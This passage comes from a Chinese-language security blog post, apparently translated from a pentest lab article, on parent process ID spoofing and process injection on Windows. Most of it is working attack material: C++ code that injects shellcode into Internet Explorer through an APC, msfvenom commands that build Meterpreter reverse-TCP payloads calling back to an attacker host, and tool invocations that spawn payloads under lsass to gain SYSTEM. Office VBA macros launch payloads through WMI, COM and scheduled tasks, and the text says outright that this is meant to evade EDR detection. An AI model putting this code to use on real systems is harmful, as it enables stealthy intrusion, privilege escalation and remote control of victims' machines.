src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F4B.tmp.jpg"></a><br>我们也可以通过修改代码以执行任意二进制文件:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130858-5d6f274a-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F4C.tmp.jpg"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014130912-65d1eb7a-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F5D.tmp.jpg"></a><br>根据Microsoft文档表述，”异步过程调用”是在特定线程的上下文中异步执行的函数，Halil Dalabasmaz在他的C++工具<a href="https://github.com/hlldz/APC-PPID" title="APC-PPID">APC-PPID</a>中使用了一种进程注入方法，实现了父pid欺骗。<br>最初，函数”getParentProcessID()”用于检索父进程的PID，”TlHelp32.h”支持”CreateToolhelp32Snapshot”函数，该函数负责拍摄指定进程的快照(explorer.exe)，拍摄快照时，将检索进程大小和PID，并关闭句柄：</p><p>DWORD getParentProcessID**()** <strong>{</strong></p><pre class="line-numbers language-none"><code class="language-none">HANDLE snapshot **=** CreateToolhelp32Snapshot **(** TH32CS_SNAPPROCESS**,**  **0** **);**PROCESSENTRY32 process **=** **{** **0** **};**process **.** dwSize **=**  **sizeof**  **(** process**);****if**  **(** Process32First **(** snapshot**,**  **&amp;** process**))** **{**    **do** **{**                *//If you want to another process as parent change here*        **if**  **(**  **!** wcscmp **(** process **.** szExeFile**,** L"explorer.exe"**))**             **break** **;**    **}** **while**  **(** Process32Next **(** snapshot**,**  **&amp;** process**));****}**CloseHandle **(** snapshot**);****return** process **.** th32ProcessID**;}**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows API “CreateProcess”用于在系统(Iexplore.exe)上创建一个具有”STARTUPINFOEXA”结构的新进程</p><p><em>#include</em> &amp;#x3c;windows.h&gt;<em>#include</em> &amp;#x3c;TlHelp32.h&gt;<em>#include</em> &amp;#x3c;iostream&gt;</p><p>DWORD getParentProcessID**()** <strong>{</strong></p><pre class="line-numbers language-none"><code class="language-none">HANDLE snapshot **=** CreateToolhelp32Snapshot **(** TH32CS_SNAPPROCESS**,**  **0** **);**PROCESSENTRY32 process **=** **{** **0** **};**process **.** dwSize **=**  **sizeof**  **(** process**);****if**  **(** Process32First **(** snapshot**,**  **&amp;** process**))** **{**    **do** **{**                *//If you want to another process as parent change here*        **if**  **(**  **!** wcscmp **(** process **.** szExeFile**,** L"explorer.exe"**))**             **break** **;**    **}** **while**  **(** Process32Next **(** snapshot**,**  **&amp;** process**));****}**CloseHandle **(** snapshot**);****return** process **.** th32ProcessID**;}**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>int</strong> main**()** <strong>{</strong></p><pre class="line-numbers language-none"><code class="language-none">*//Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c***unsigned** **char** shellCode**[]** **=** ""**;**STARTUPINFOEXA sInfoEX**;**PROCESS_INFORMATION pInfo**;**SIZE_T sizeT**;**HANDLE expHandle **=** OpenProcess **(** PROCESS_ALL_ACCESS**,** false**,** getParentProcessID**());**ZeroMemory **(**  **&amp;** sInfoEX**,**  **sizeof**  **(** STARTUPINFOEXA**));**InitializeProcThreadAttributeList **(** NULL**,**  **1** **,**  **0** **,**  **&amp;** sizeT**);**sInfoEX **.** lpAttributeList **=**  **(** LPPROC_THREAD_ATTRIBUTE_LIST **)** HeapAlloc **(** GetProcessHeap**(),**  **0** **,** sizeT**);**InitializeProcThreadAttributeList **(** sInfoEX **.** lpAttributeList**,**  **1** **,**  **0** **,**  **&amp;** sizeT**);**UpdateProcThreadAttribute **(** sInfoEX **.** lpAttributeList**,**  **0** **,** PROC_THREAD_ATTRIBUTE_PARENT_PROCESS**,**  **&amp;** expHandle**,**  **sizeof**  **(** HANDLE**),** NULL**,** NULL**);**sInfoEX **.** StartupInfo **.** cb **=**  **sizeof**  **(** STARTUPINFOEXA**);**CreateProcessA **(** "C:\\Program Files\\internet explorer\\iexplore.exe"**,** NULL**,** NULL**,** NULL**,** TRUE**,** CREATE_SUSPENDED **|** CREATE_NO_WINDOW **|** EXTENDED_STARTUPINFO_PRESENT**,** NULL**,** NULL**,** reinterpret_cast **&lt;** LPSTARTUPINFOA **&gt;**  **(**  **&amp;** sInfoEX**),**  **&amp;** pInfo**);**LPVOID lpBaseAddress **=**  **(** LPVOID **)** VirtualAllocEx **(** pInfo **.** hProcess**,** NULL**,**  **0x1000** **,** MEM_RESERVE **|** MEM_COMMIT**,** PAGE_EXECUTE_READWRITE**);**SIZE_T  ***** lpNumberOfBytesWritten **=**  **0** **;**BOOL resWPM **=** WriteProcessMemory **(** pInfo **.** hProcess**,** lpBaseAddress**,**  **(** LPVOID **)** shellCode**,**  **sizeof**  **(** shellCode**),** lpNumberOfBytesWritten**);**QueueUserAPC **((** PAPCFUNC **)** lpBaseAddress**,** pInfo **.** hThread**,** NULL**);**ResumeThread **(** pInfo **.** hThread**);**CloseHandle **(** pInfo **.** hThread**);****return**  **0** **;}**<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131041-9b0b8cba-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F5E.tmp.jpg"></a><br>Metasploit实用程序”msfvenom”可以用于生成c语言的shellcode：</p><p>msfvenom  <strong>-</strong> p windows <strong>/</strong> x64 <strong>/</strong> meterpreter <strong>/</strong> reverse_tcp LHOST <strong>=</strong> <strong>10.0.0.13</strong> LPORT <strong>=</strong> <strong>4444</strong> EXITFUNC <strong>=</strong> <strong>thread</strong>  <strong>-</strong> f c <strong>&gt;</strong> pentestlab <strong>.</strong> txt</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131147-c2676d56-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F6E.tmp.jpg"></a><br>之后替换shellCode[]:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131231-dcbeb970-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F6F.tmp.jpg"></a><br>在目标系统上执行二进制文件将创建一个新的进程(Iexplore.exe )，该进程的父进程是explorer.exe，shellcode将通过使用用户模式异步过程调用在internet explorer进程的内存空间中执行:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131247-e63a3286-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F70.tmp.jpg"></a><br>之后将会返回一个目标主机的Meterpreter会话：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131306-f19b7004-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F81.tmp.jpg"></a><br>查看目标系统的进程将显示”iexplore.exe”已成功创建<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131321-fa85557c-0ddb-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F82.tmp.jpg"></a><br>查看进程属性将验证父进程是”explorer.exe”，这个POC实现了一个更隐蔽的进程注入方法来隐藏进程内部的shellcode，并且由于explorer和internet explorer都是有效的，Microsoft系统进程将绕过EDR检测:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131338-0480f766-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F83.tmp.jpg"></a><br>Julian Horoszkiewicz基于Didier Stevens的工作开发了一个C++(PPID-Spoof)工具，它可以用于父进程欺骗，并且允许用户选择父进程PID</p><p>spoof <strong>.</strong> exe pentestlab <strong>.</strong> exe <strong>1116</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131414-1a342aa6-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F93.tmp.jpg"></a><br>一旦在目标主机上创建了进程，将执行任意负载并打开一个会话<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131433-251ad906-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3F94.tmp.jpg"></a><br>在process explorer中查看PID的进程细节可以看到该进程是explorer.exe的子进程：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131451-30537468-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FA5.tmp.jpg"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131507-39b8da7a-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FB6.tmp.jpg"></a></p><h2 id="CSharp"><a href="#CSharp" class="headerlink" title="CSharp"></a><strong>CSharp</strong></h2><p><a href="https://github.com/py7hagoras/GetSystem" title="Getsystem">Getsystem</a>二进制文件是用c#开发的，它实现了父进程PID欺骗，以便提升对系统的权限，这是通过类似于F-Secure实验室发布的代码的”CreateProcess”API实现的。.Net binary只接受两个参数，即任意可执行文件和将作为父进程的进程名</p><p>GetSystem <strong>.</strong> exe pentestlab <strong>.</strong> exe lsass</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131535-4a70ac94-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FB7.tmp.jpg"></a><br>进程”pentestlab.exe”将作为”lsass.exe”的子进程在目标主机上创建:<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131552-54639874-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FB8.tmp.jpg"></a><br>之后将返回一个Meterpreter会话，且为SYSTEM权限：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131609-5ea55926-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FC8.tmp.jpg"></a><br>这里的”getsystem”是基于c#的，这使得它能够通过Covenant或任何其他可以加载汇编二进制文件的相关框架(CS)来实现这项技术:</p><p>Assembly GetSystem <strong>.</strong> exe “pentestlab.exe lsass”</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131631-6be508b6-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FC9.tmp.jpg"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131647-753c7f70-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FCA.tmp.jpg"></a><br>类似于Metasploit框架的”migrate”命令，可以执行Assembly二进制文件，之后将进程从管理员提升到系统<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131706-80a85e60-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FDB.tmp.jpg"></a><br>对可用”Grunts”列表的调查将显示，与初始进程相比，新代理以系统级权限运行<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131731-8f516ff6-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FDC.tmp.jpg"></a><br>父进程可以是”lsass”或以系统级权限运行的任何其他进程<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131749-9a6ec546-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FDD.tmp.jpg"></a><br>Chirag Savla使用c#开发了一个工具，通过利用所有常见的windows API(create process、virtualallocex、openprocess等)来执行进程注入，并能够执行父pid欺骗)，该工具的好处是支持带有父PID欺骗的不同进程注入技术，该工具接受base-64、c和hex中的shelllcode，我们可以使用Msfvenom来生成这些格式的shellcode：</p><p>msfvenom  <strong>-</strong> p windows <strong>/</strong> x64 <strong>/</strong> meterpreter <strong>/</strong> reverse_tcp exitfunc <strong>=</strong> <strong>thread</strong> LHOST <strong>=</strong> <strong>10.0.0.13</strong> LPORT <strong>=</strong> <strong>4444</strong>  <strong>-</strong> f hex <strong>&gt;</strong> pentestlab <strong>.</strong> txt</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131811-a74a6a7c-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FED.tmp.jpg"></a><br>该工具需要注入进程的路径、shellcode的路径、父进程名、有效负载的文件格式和进程注入技术，执行下面的命令将把shellcode注入一个新的进程(calc.exe )并使用explorer.exe作为父进程</p><p>ProcessInjection <strong>.</strong> exe  <strong>/</strong> ppath <strong>:</strong> “C:\Windows\System32\calc.exe”  <strong>/</strong> path <strong>:</strong> “pentestlab.txt”  <strong>/</strong> parentproc <strong>:</strong> explorer  <strong>/</strong> f <strong>:</strong> hex  <strong>/</strong> t <strong>:</strong> <strong>4</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131830-b2863bc8-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FEE.tmp.jpg"></a><br>从Porcess Monitor可以看到calc.exe是在explorer.exe环境下创建的<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131857-c2d8f4ac-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps3FEF.tmp.jpg"></a><br>shellcode将在calc.exe的虚拟地址空间中执行，并且将与MSF建立通信<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014131925-d39092fa-0ddc-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4000.tmp.jpg"></a><br>ProcessInjection还支持通过dll注入进行父PID欺骗，可以用msfvenom来生成任意的dll文件</p><p>msfvenom  <strong>-</strong> p windows <strong>/</strong> x64 <strong>/</strong> meterpreter <strong>/</strong> reverse_tcp exitfunc <strong>=</strong> <strong>thread</strong> LHOST <strong>=</strong> <strong>10.0.0.13</strong> LPORT <strong>=</strong> <strong>4444</strong>  <strong>-</strong> f dll <strong>&gt;</strong> pentestlab <strong>.</strong> dll</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132106-0faa7512-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4001.tmp.jpg"></a><br>在使用时需要指定dll的路径，而不是ShellCode，并且技术值应该更改为5：</p><p>ProcessInjection <strong>.</strong> exe  <strong>/</strong> ppath <strong>:</strong> “C:\Windows\System32\calc.exe”  <strong>/</strong> path <strong>:</strong> “pentestlab.dll”  <strong>/</strong> parentproc <strong>:</strong> explorer  <strong>/</strong> t <strong>:</strong> <strong>5</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132135-20c63b74-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4002.tmp.jpg"></a><br>当在进程内部创建远程线程时，将执行shell代码并打开一个Meterpreter会话<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132153-2ba15902-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4013.tmp.jpg"></a><br>该Session将在”rundll32”进程的上下文下运行<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132211-364fd810-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4014.tmp.jpg"></a><br>指定技术6将使用进程空洞化技术执行父进程欺骗</p><p>ProcessInjection <strong>.</strong> exe  <strong>/</strong> ppath <strong>:</strong> “C:\Windows\System32\calc.exe”  <strong>/</strong> path <strong>:</strong> “pentestlab.txt”  <strong>/</strong> parentproc <strong>:</strong> explorer  <strong>/</strong> f <strong>:</strong> hex  <strong>/</strong> t <strong>:</strong> <strong>6</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132240-47c86b02-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4024.tmp.jpg"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132254-4fae51f6-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4025.tmp.jpg"></a><br>该工具还支持带有异步过程调用的进程注入，对于更隐蔽的方法shellcode的执行将发生在目标进程的主线程的入口点之前</p><p>ProcessInjection <strong>.</strong> exe  <strong>/</strong> ppath <strong>:</strong> “C:\Windows\System32\calc.exe”  <strong>/</strong> path <strong>:</strong> “pentestlab.txt”  <strong>/</strong> parentproc <strong>:</strong> explorer  <strong>/</strong> f <strong>:</strong> hex  <strong>/</strong> t <strong>:</strong> <strong>8</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132324-61df7684-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4026.tmp.jpg"></a><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132337-699826b4-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4037.tmp.jpg"></a><br>一个名为<a href="https://github.com/Mr-Un1k0d3r/RemoteProcessInjection" title="Remote ProcessInjection">Remote ProcessInjection</a>的c#实用程序也能够执行进程注入，该工具是为Cobalt Strike设计的，并接受base-64的有效载荷，Msfvenom可以生成原始的ShellCode，之后将该Shell Code转换为base-64：</p><p>msfvenom  <strong>-</strong> p windows <strong>/</strong> x64 <strong>/</strong> meterpreter <strong>/</strong> reverse_tcp  <strong>-</strong> f raw  <strong>-</strong> o payload64 <strong>.</strong> bin LHOST <strong>=</strong> <strong>10.0.0.13</strong> LPORT <strong>=</strong> <strong>4444</strong>base64  <strong>-</strong> i  <strong>/</strong> root <strong>/</strong> payload64 <strong>.</strong> bin <strong>&gt;</strong> payload64 <strong>.</strong> txt</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132421-839d8dba-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4038.tmp.jpg"></a><br>ShellCode将被注入到目标进程中，尽管它没有利用”CreateProcess”API来欺骗父进程，但它提供了在合法的WIndows进程中隐藏恶意软件的能力：</p><p>RemoteInject64 <strong>.</strong> exe <strong>4272</strong>  <strong>&amp;#x3c;</strong> base64 <strong>-</strong> shellcode**&gt;**</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132442-909b40fc-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4039.tmp.jpg"></a><br>有效负载将从目标进程的内存地址空间执行，进程注入方法与Metasploit的”migrate” 命令相似，都使用相同的Windows API<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132501-9b7cbe88-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4049.tmp.jpg"></a></p><h2 id="VBA"><a href="#VBA" class="headerlink" title="VBA"></a><strong>VBA</strong></h2><p>Microsoft Office一直是非常受欢迎的恶意软件中间应用，因为它帮助红队在目标内部环境获得最初的立足点，然而以宏的形式执行恶意代码将会创建任意的子进程，这很容易被具有分析进程的父和子关系之间的异常的能力的EDR发现。<br>有多种方法可用于逃避对提供父/子关系检测的EDR产品，例如，VBScript可以调用其他系统资源来执行恶意软件，如WMI、COM或计划任务，父进程可以不是Windows Word，而是Windows操作系统的进程，以下宏将使用wmi(Windows Management Instrumentation)来创建新进程</p><p>Sub Parent**()**</p><p>Set objWMIService <strong>=</strong> GetObject <strong>(</strong> “winmgmts: <strong>{</strong> impersonationLevel <strong>=</strong> impersonate <strong>}</strong>  <strong>!</strong> \ <strong>.</strong> \root\cimv2”)Set objStartup <strong>=</strong> objWMIService <strong>.</strong> Get <strong>(</strong> “Win32_ProcessStartup” <strong>)</strong> Set objConfig <strong>=</strong> objStartup <strong>.</strong> SpawnInstance_Set objProcess <strong>=</strong> GetObject <strong>(</strong> “winmgmts:root\cimv2:Win32_Process” <strong>)</strong> errReturn <strong>=</strong> objProcess <strong>.</strong> Create <strong>(</strong> “C:\Temp\pentestlab.exe”<strong>,</strong> Null**,** objConfig**,** intProcessID**)**</p><p>End Sub</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132537-b146c4ac-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps404A.tmp.jpg"></a><br>这种方法的好处是创建的进程将在”WmiPrvSE.exe”下生成，而不是Office进程<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132557-bcdb0544-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps405B.tmp.jpg"></a><br>之后将会返回一个Meterpreter会话：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132615-c783c5f8-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps406C.tmp.jpg"></a><br>COM对象也可以用来执行新的进程：</p><p>Sub Parent**()**</p><p>Set obj <strong>=</strong> GetObject <strong>(</strong> “new:C08AFD90-F2A1-11D1-8455-00A0C91F3880” <strong>)</strong> obj <strong>.</strong> Document <strong>.</strong> Application <strong>.</strong> ShellExecute “pentestlab.exe” <strong>,</strong> Null <strong>,</strong> “C:\Temp",Null,0</p><p>End Sub</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132641-d74da1e8-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps406D.tmp.jpg"></a><br>使用此方法执行恶意文件的结果是，父进程将是”explorer.exe”，即使程序的执行在office应用内部进行：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132700-e2720f82-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps407D.tmp.jpg"></a><br>下图为通过执行任意有效负载的COM对象后返回的一个Meterpreter会话：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132718-ed1226b6-0ddd-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps407E.tmp.jpg"></a><br>计划任务经常被用作一种持久性方法，因为它允许红队在特定的日期或时间执行他们的事务，它也可以用于父PID欺骗，因为调度任务可以直接从VBScript创建，下面的代码注册了一个新的调度任务，该任务将在30秒后触发有效负载的执行</p><p>Sub Parent <strong>()</strong> Set service <strong>=</strong> CreateObject <strong>(</strong> “Schedule.Service” <strong>)</strong> Call service <strong>.</strong> ConnectDim td**:** Set td <strong>=</strong> service <strong>.</strong> NewTask <strong>(</strong>  <strong>0</strong>  <strong>)</strong> td <strong>.</strong> RegistrationInfo <strong>.</strong> Author <strong>=</strong> “Pentest Laboratories”td <strong>.</strong> settings <strong>.</strong> StartWhenAvailable <strong>=</strong> Truetd <strong>.</strong> settings <strong>.</strong> Hidden <strong>=</strong> FalseDim triggers**:** Set triggers <strong>=</strong> td <strong>.</strong> triggersDim trigger**:** Set trigger <strong>=</strong> triggers <strong>.</strong> Create <strong>(</strong>  <strong>1</strong>  <strong>)</strong> Dim startTime**:** ts <strong>=</strong> DateAdd <strong>(</strong> “s”<strong>,</strong>  <strong>30</strong> <strong>,</strong> Now <strong>)</strong> startTime <strong>=</strong> Year <strong>(</strong> ts**)** <strong>&amp;</strong> “-“ <strong>&amp;</strong> Right <strong>(</strong> Month <strong>(</strong> ts**),**  <strong>2</strong> <strong>)</strong> <strong>&amp;</strong> “-“ <strong>&amp;</strong> Right <strong>(</strong> Day <strong>(</strong> ts**),**  <strong>2</strong> <strong>)</strong> <strong>&amp;</strong> “T” <strong>&amp;</strong> Right <strong>(</strong> Hour <strong>(</strong> ts**),**  <strong>2</strong> <strong>)</strong> <strong>&amp;</strong> “:” <strong>&amp;</strong> Right <strong>(</strong> Minute <strong>(</strong> ts**),**  <strong>2</strong> <strong>)</strong> <strong>&amp;</strong> “:” <strong>&amp;</strong> Right <strong>(</strong> Second <strong>(</strong> ts**),**  <strong>2</strong>  <strong>)</strong> trigger <strong>.</strong> StartBoundary <strong>=</strong> startTimetrigger <strong>.</strong> ID <strong>=</strong> “TimeTriggerId”Dim Action**:** Set Action <strong>=</strong> td <strong>.</strong> Actions <strong>.</strong> Create <strong>(</strong>  <strong>0</strong>  <strong>)</strong> Action <strong>.</strong> Path <strong>=</strong> “C:\Users\pentestlab.exe”Call service <strong>.</strong> GetFolder <strong>(</strong> “").RegisterTaskDefinition(“PentestLab”, td, 6, , , 3)End Sub</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132818-113c8342-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps407F.tmp.jpg"></a><br>新的进程将不再以微软产品的流程为父进程，而是以”svchost.exe”作为更隐蔽的方法：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132858-28e92e28-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4090.tmp.jpg"></a><br>查看进程属性可以看到父进程是”svhcost.exe”<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014132925-39253caa-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4091.tmp.jpg"></a></p><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h2><p>Metasploit框架包含一个后渗透测试模块，可用于将现有的Meterpreter会话迁移到系统上的另一个进程，该模块将遵循与本文中描述的其他工具相同的功能，以便将现有的shell代码重写到另一个进程的地址空间中，具体而言该模块将遵循以下流程:</p><p>· 获取目标进程的PID</p><p>· 检查目标进程的体系结构(32位或64位)</p><p>· 检查meterpreter会话是否具有SeDebugPrivilege</p><p>· 从现有进程中检索负载</p><p>· 调用OpenProcess() API以获得对目标进程虚拟内存的访问</p><p>· 调用VirtualAllocEx() API以在目标进程中分配rwx内存</p><p>· 调用WriteProcessMemory() API以将负载写入进程的虚拟内存空间</p><p>· 调用CreateRemoteThread() API以在目标进程的虚拟内存空间中创建一个线程</p><p>· 关闭上一个线程</p><p>使用PID和目标进程的名称来定义现有会话</p><p>use post <strong>/</strong> windows <strong>/</strong> manage <strong>/</strong> migrateset SESSION <strong>1</strong>set PID <strong>508</strong>set NAME lsass <strong>.</strong> exeset KILL true</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014133007-51d7fc06-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps4092.tmp.jpg"></a><br>执行结果如下所示：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014133026-5d64504c-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps40A2.tmp.jpg"></a><br>类似地，Meterpreter还包含”migrate”命令，该命令可以将现有会话迁移到另一个进程<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20201014133046-6934aeee-0dde-1.png"><img src="file:///C:\Users\ww\AppData\Local\Temp\ksohtml\wps40A3.tmp.jpg"></a></p><h2 id="Toolkit"><a href="#Toolkit" class="headerlink" title="Toolkit"></a><strong>Toolkit</strong></h2><p>本文涉及到的工具如下所示：</p><p>· SelectMyParent(C++):<a href="http://www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip">http://www.didierstevens.com/files/software/SelectMyParent_v0_0_0_1.zip</a></p><p>· ppid-spoofing(PowerShell):<a href="https://github.com/countercept/ppid-spoofing">https://github.com/countercept/ppid-spoofing</a></p><p>· GetSystem(C#):<a href="https://github.com/py7hagoras/GetSystem">https://github.com/py7hagoras/GetSystem</a></p><p>· GetSystem-Offline(C++):<a href="https://github.com/xpn/getsystem-offline">https://github.com/xpn/getsystem-offline</a></p><p>· APC-PPID(C++)：<a href="https://github.com/hlldz/APC-PPID">https://github.com/hlldz/APC-PPID</a></p><p>· psgetsystem(PowerShell)：<a href="https://github.com/decoder-it/psgetsystem">https://github.com/decoder-it/psgetsystem</a></p><p>· PPID-Spoofing(C++)：<a href="https://github.com/ewilded/PPID_spoof">https://github.com/ewilded/PPID_spoof</a></p><p>· ProcessInjection(C#)：<a href="https://github.com/3xpl01tc0d3r/ProcessInjection">https://github.com/3xpl01tc0d3r/ProcessInjection</a></p><p>· RemoteProcessInjection(C#)：<a href="https://github.com/Mr-Un1k0d3r/RemoteProcessInjection">https://github.com/Mr-Un1k0d3r/RemoteProcessInjection</a></p><p>· Spoofing-Office-Macro(VBA)：<a href="https://github.com/christophetd/spoofing-office-macro">https://github.com/christophetd/spoofing-office-macro</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h2><p><a href="https://attack.mitre.org/techniques/T1502/">https://attack.mitre.org/techniques/T1502/</a><br><a href="https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/">https://blog.didierstevens.com/2009/11/22/quickpost-selectmyparent-or-playing-with-the-windows-process-tree/</a><br><a href="https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/">https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/</a><br><a href="https://blog.xpnsec.com/becoming-system/">https://blog.xpnsec.com/becoming-system/</a><br><a 